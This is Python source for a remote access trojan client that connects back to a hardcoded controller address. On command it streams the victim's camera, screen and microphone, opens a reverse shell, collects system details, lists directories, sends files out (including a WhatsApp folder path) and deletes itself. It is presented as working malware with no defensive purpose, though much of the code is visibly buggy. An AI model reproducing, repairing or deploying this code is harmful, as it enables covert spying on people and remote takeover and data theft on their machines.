 #--------------------------------------------------------------------------------------------#
import sys
import time
import os
#import requests
import socket
import threading
#import shutil
import platform
import subprocess
#---------------------------------------------------------------------------------------------#
try:
    import vidstream
except:
    os.system("pip install vidstream --upgrade > install && rm install")
    import vidstream
#---------------------------------------------------------------------------------------------#
"""
if platform.system() == "Linux":
    COMMAND_OUT = subprocess.check_output(["scrot", "--version"])
    COMMAND_OUT_SPLIT = COMMAND_OUT.split(b" ")
    if b"version" in COMMAND_OUT_SPLIT:
        pass
    else:
        try:
            os.system("pacman -S --noconfirm scrot > install && rm install")
        except:
            os.system("apt install scrot > install && rm install")
else:
    pass
"""
#---------------------------------------------------------------------------------------------#
from vidstream import CameraClient
from vidstream import AudioSender
from vidstream import ScreenShareClient
#---------------------------------------------------------------------------------------------#
HOST = "192.168.1.35"
SELF_NAME = ""
SOCKET_PORT = 9999
CAMERA_STREAMING_PORT = 0
SCREEN_STREAMING_PORT = 0
AUDIO_SENDER_PORT = 0
WHATSAPP_PORT = 0
#---------------------------------------------------------------------------------------------#
WHATSAPP_D_PATH = "/sdcard/WhatsApp"
WHATSAPP_B_PATH = ""
WHATSAPP_D = False
WHATSAPP_B = False
PATH = ""
#---------------------------------------------------------------------------------------------#
class CameraStreaming:
    def __init__(self, _host, _port):
        self.__host = _host
        self.__port = _port
    def StartStreaming(self, host, port):
        global CAMERA_STREAMING    
        CAMERA_STREAMING = CameraClient(host, port)
        CAMERA_STREAMING_THREAD = threading.Thread(
                        target=CAMERA_STREAMING.start_stream()
                )
        CAMERA_STREAMING_THREAD.start()
    def StopStreaming(self):
        CAMERA_STREAMING.stop_stream()
#---------------------------------------------------------------------------------------------#
class ScreenStreaming:
    def __init__(self, _host, _port):
        self.__host = _host
        self.__port = _port 
    #global SCREEN_STREAMING
    def StartScreenStreaming(self, host, port):
        global SCREEN_STREAMING
        SCREEN_STREAMING = ScreenShareClient(host, port)
        SCREEN_STREAMING_THREAD = threading.Thread(
                        target=SCREEN_STREAMING.start_stream()
                    )
        SCREEN_STREAMING_THREAD.start()
    def StopScreenStreaming(self):
        SCREEN_STREAMING.stop_stream()
#---------------------------------------------------------------------------------------------#
class SendAudio:
    def __init__(self, _host, _port):
        self.__host = _host
        self.__port = _port
    def StartSendingAudio(self, host, port):
        global AUDIO_SENDING
        AUDIO_SENDING = AudioSender(host, port)
        AUDIO_SENDING_THREAD = threading.Thread(
                        target=AUDIO_SENDING.start_stream()
                )
        AUDIO_SENDING_THREAD.start()
    def StopAudioSending(self):
        AUDIO_SENDING.stop_stream()
#---------------------------------------------------------------------------------------------#
class ReverseShell:
    def __init__(self, _host, _port, _socket):
        self.__host = _host
        self.__port = _port
        self.__socket = _socket
    def StartReverShell(self, _socket):
        RCV_MSG = []
        while True:
            MSG_DATA = _socket.rcv(999999)
            MSG_DATA.decode()
            if MSG_DATA[0:] == "cd":
                os.chdir(MSG_DATA[2:].decode("utf-8"))
            if len(MSG_DATA) > 0:
                CommandUotput = subprocess.Popen(MSG_DATA[:], shell=True, stdout=subprocess.PIPE ,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                StrData = CommandUotput.stdout.read() + CommandUotput.stderr.read()
                BytesData = str(StrData,"utf-8")
                _socket.send(str.decode(BytesData))
            if MSG_DATA == "stop reverse_shell":
                break
#---------------------------------------------------------------------------------------------#
class FilesKidnapper(object):
    def __init__(self, _WHAT_TO_SEND, _socket, _path):
        self.__W_T_S = _WHAT_TO_SEND
        self.__socket = _socket
        self.__path = _path
        self.__wht_to_send = _WHAT_TO_SEND
    global ALL_THE_FILES_AND_FOLDERS
    ALL_THE_FILES_AND_FOLDERS = {}
    def SEND_NAME_OF_FILES_AND_FOLDERS(self, path, _socket):
        USER_NAME = os.listdir("/home")
        USER_NAME.remove("guest")
        if path is None:
            FILES_AND_DIR = os.listdir(f"/home/{USER_NAME[0]}")
            for d in FILES_AND_DIR:
                g = f"/home/{USER_NAME[0]}/{FILES_AND_DIR}"
                ALL_THE_FILES_AND_FOLDERS[g] = FILES_AND_DIR
        else:
            OPEN_PATH_OS = os.listdir(path)
            for d in OPEN_PATH_OS:
                ALL_THE_FILES_AND_FOLDERS[f"{path}/{d}"] = f"{d}"
        for _, i in ALL_THE_FILES_AND_FOLDERS:
            _.encode()
            i.encode()
        _socket.send(ALL_THE_FILES_AND_FOLDERS)
    def SEND_FOLDERS_CONTENT(self, _socket):
        DIR_CONTENT = {}
        for x in ALL_THE_FILES_AND_FOLDERS:
            try:
                F = os.listdir(f"{x}")
                DIR_CONTENT[f"{x}"] = F
            except NotADirectoryError:
                pass
            for _, i in DIR_CONTENT:
                _.encode()
                for ls in i:
                    ls.encode()
        _socket.send(DIR_CONTENT)
    def SEND_SPEC_FILE(self, path, _socket):
        try:
            BUFFER_SIZE = 999999
            with open(path, "r") as SPEC_FILE:
                while True:
                    READING_FILE = SPEC_FILE.read(BUFFER_SIZE)
                    while (READING_FILE):
                        _socket.sendall(READING_FILE.encode("utf-8"))
                        READ_SIZE = SPEC_FILE.read(BUFFER_SIZE)
                    if not READING_FILE:
                        SPEC_FILE.close()
                        break
        except FileNotFoundError:
            _socket.send(f"unkown {path}".encode())
    def SEND_SPEC_FOLDER_CONTENT(self, path, _socket):
        FOLDER_CONTENT_LIST = {}
        try:
            FOLDER_CONTENT = os.listdir(path)
            FOLDER_CONTENT_LIST[f"{path}"] = FOLDER_CONTENT
        except NotADirectoryError:
            _socket.send(f"unkown {path}")
            return False
        for _, i in FOLDER_CONTENT_LIST:
            _.encode()
            for ls in i:
                ls.encode()
        _socket.send(FOLDER_CONTENT_LIST)
#---------------------------------------------------------------------------------------------#
def info_gathering(server):
    ALL_INFO = {
            b"target_user_name" : b"",
            b"platform" : b"",
            b"machine" : b"",
            b"node" : b"",
            b"architecture" : b"",
            b"version" : b"",
            b"processor" : b"",
            b"release" : b"",
            b"host ip" : b"",
            b"ip" : b""
            }
    """
        trying to get 
        the target user name
    """
    NAME = os.listdir("/home")
    LIST_NAMES = "|"
    for x in NAME:
        LIST_NAMES += f" {x} |"
    ALL_INFO["target_user_name"] = LIST_NAMES
    """
        get 
        the system platform
    """
    ALL_INFO["platform"] = platform.system()
    """
        the machine     
    """
    ALL_INFO["machine"] = platform.machine()
    """
        the node
    """
    ALL_INFO["node"] = platform.node()
    """
        system architecture
    """
    LIST_ARCHITECTURE = "|"
    for i in platform.architecture():
        LIST_ARCHITECTURE += f" {i} |"
    ALL_INFO["architecture"] = LIST_ARCHITECTURE
    """
        release
    """
    ALL_INFO["release"] = platform.release()
    """
        version    
    """
    ALL_INFO["version"] = platform.version()
    """
        processor
    """
    ALL_INFO["processor"] = platform.processor()
    """
        getting the host ip
    """
    ALL_INFO["host ip"] = socket.gethostbyname(socket.gethostname())
    server.send(ALL_INFO)
#---------------------------------------------------------------------------------------------#
RCV_MSG = []
#---------------------------------------------------------------------------------------------#
def MSG_KEEPER(SERVER_RCV_MSG):
    while True:
        if len(SERVER_RCV_MSG.decode()) > 0:
            RCV_MSG.append(SERVER_RCV_MSG.decode())
        else:
            pass
#---------------------------------------------------------------------------------------------#
SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

for i in range(5):
    try:
        SERVER.connect((HOST, SOCKET_PORT))
    except Exception:
        time.sleep(2)

RCV_MSG_TH = threading.Thread(target=MSG_KEEPER(SERVER.recv(1024)))
RCV_MSG_TH.start()
#---------------------------------------------------------------------------------------------#
POSSI_MSG_COMMAND = [
            "init stream",
            "init screen_stream",
            "init audio_listener",
            "init reverse_shell",
            "get info",
            "self DES",
            "stop all",
            "stop stream",
            "stop screen_stream",
            "stop audio_listener",
            "stop reverse_shell",
            "show files",
            "get file",
            "show dir",
            "show all dir"
        ]
#---------------------------------------------------------------------------------------------#
def run():
    while True:
        if len(RCV_MSG) > 0:
            #camera stream
            if RCV_MSG[0] == POSSI_MSG_COMMAND[0]:
                STREAM = CameraStreaming
                STREAM.StartStreaming(
                            host=HOST,
                            port=CAMERA_STREAMING_PORT
                        )
                RCV_MSG.remove(POSSI_MSG_COMMAND[0])
                while POSSI_MSG_COMMAND[7] not in RCV_MSG:
                    pass
                else:
                    STREAM.StopStreaming()
                    RCV_MSG.remove(POSSI_MSG_COMMAND[7])
            #screen stream
            elif RCV_MSG[0] == POSSI_MSG_COMMAND[1]:
                SCREEN_STREAM = ScreenStreaming
                SCREEN_STREAM.StartScreenStreaming(
                            host=HOST,
                            port=SCREEN_STREAMING_PORT
                        )
                RCV_MSG.remove(POSSI_MSG_COMMAND[1])
                while POSSI_MSG_COMMAND[8] not in RCV_MSG:
                    pass
                else:
                    SCREEN_STREAM.StopScreenStreaming()
                    RCV_MSG.remove(POSSI_MSG_COMMAND[8])
            #audio listner
            elif RCV_MSG[0] == POSSI_MSG_COMMAND[2]:
                AUDIO_LISTENER = AudioSender
                AUDIO_LISTENER.StartSendingAudio(
                            host=HOST,
                            port=AUDIO_SENDER_PORT
                        )
                RCV_MSG.remove(POSSI_MSG_COMMAND[2])
                while POSSI_MSG_COMMAND[9] not in RCV_MSG:
                    pass
                else:
                    AUDIO_LISTENER.StopAudioSending()
                    RCV_MSG.remove(POSSI_MSG_COMMAND[9])
            #reverse shell
            elif RCV_MSG[0] == POSSI_MSG_COMMAND[3]:
                REVERSE_SHELL = ReverseShell
                REVERSE_SHELL.StartReverShell(_socket=SERVER)
                RCV_MSG.remove(POSSI_MSG_COMMAND[3])
            #info gathering
            elif RCV_MSG[0] == POSSI_MSG_COMMAND[4]:
                info_gathering(server=SERVER)
                RCV_MSG.remove(POSSI_MSG_COMMAND[4])
            #self destraction
            elif RCV_MSG[0] == POSSI_MSG_COMMAND[5]:
                os.system(f"rm {SELF_NAME}")
            #sotoping the socket
            elif RCV_MSG[0] == POSSI_MSG_COMMAND[6]:
                SERVER.close()
                sys.exit()
            #handiling files on folders commands
            FILES = FilesKidnapper
            if RCV_MSG[0].startswith(POSSI_MSG_COMMAND[11]):
                CM_MSG = RCV_MSG[0].replace(f"{POSSI_MSG_COMMAND[11]} ", "")
                if CM_MSG < 0:
                    FILES.SEND_NAME_OF_FILES_AND_FOLDERS(_socket=SERVER)
                else:
                    FILES.SEND_NAME_OF_FILES_AND_FOLDERS(_socket=SERVER, path=CM_MSG)
                RCV_MSG.remove(f"{POSSI_MSG_COMMAND[11]} {CM_MSG}")
            #send specify file
            elif RCV_MSG[0].startswith(POSSI_MSG_COMMAND[12]) :
                CM_MSG = RCV_MSG[0].replace(f"{POSSI_MSG_COMMAND[12]} ", "")
                FILES.SEND_SPEC_FILE(_socket=SERVER, path=CM_MSG)
                RCV_MSG.remove(f"{POSSI_MSG_COMMAND[12]} {CM_MSG}")
            #send specify folders content
            elif RCV_MSG[0].startswith(POSSI_MSG_COMMAND[13]):
                CM_MSG = RCV_MSG[0].replace(f"{POSSI_MSG_COMMAND[13]} ", "")
                FILES.SEND_SPEC_FOLDER_CONTENT(path=CM_MSG, _socket=SERVER)
                RCV_MSG.remove(f"{POSSI_MSG_COMMAND[13]} {CM_MSG}")
            #send all the folders content
            elif RCV_MSG[0] == POSSI_MSG_COMMAND[14]:
                FILES.SEND_FOLDERS_CONTENT(_socket=SERVER)
                RCV_MSG.remove(f"{POSSI_MSG_COMMAND[14]}")
        else:
            pass

run()